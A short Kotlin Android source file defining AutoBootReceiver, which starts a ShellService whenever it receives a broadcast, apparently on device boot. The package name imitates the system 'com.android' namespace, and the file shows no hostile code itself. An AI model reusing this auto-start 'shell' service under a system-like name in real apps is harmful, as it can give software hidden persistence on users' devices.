package com.android.shell2.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.android.shell2.services.ShellService

class AutoBootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        try {
            val intent2 = Intent(context, ShellService::class.java)
            context.startService(intent2)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}